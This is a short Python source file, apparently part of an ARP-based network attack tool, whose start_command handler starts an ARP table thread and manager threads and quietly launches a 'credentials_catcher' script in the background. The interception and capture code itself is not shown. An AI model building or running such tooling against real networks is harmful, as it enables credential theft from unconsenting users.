import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'corethreads')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
import threading
import subprocess
from corethreads.coremanager import manager
from corethreads.arptable import arptable


#
# Handler to start the attack.
#
def start_command(params):

    # Check if no attack is currently running and no process is assigned
    if ATTACK_STATUS['status'] == 0 and ATTACK_STATUS['wspid'] == 0:

        # Set attack status to "in progress"
        ATTACK_STATUS['status'] = 1

        # Start a thread for the ARP table function
        thread0 = threading.Thread(target=arptable)
        thread0.start()
        # Wait for the ARP table thread to complete
        thread0.join()

        # Start additional threads managed by a manager
        manager.start_threads()

        # Launch the credentials catcher script in a new process
        process = subprocess.Popen(["python3", "corethreads/credentials_catcher.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Store the process ID of the credentials catcher
        ATTACK_STATUS['wspid'] = process.pid

        return

    else:
        # If the attack is already in progress, notify the user
        print("Attack already started")
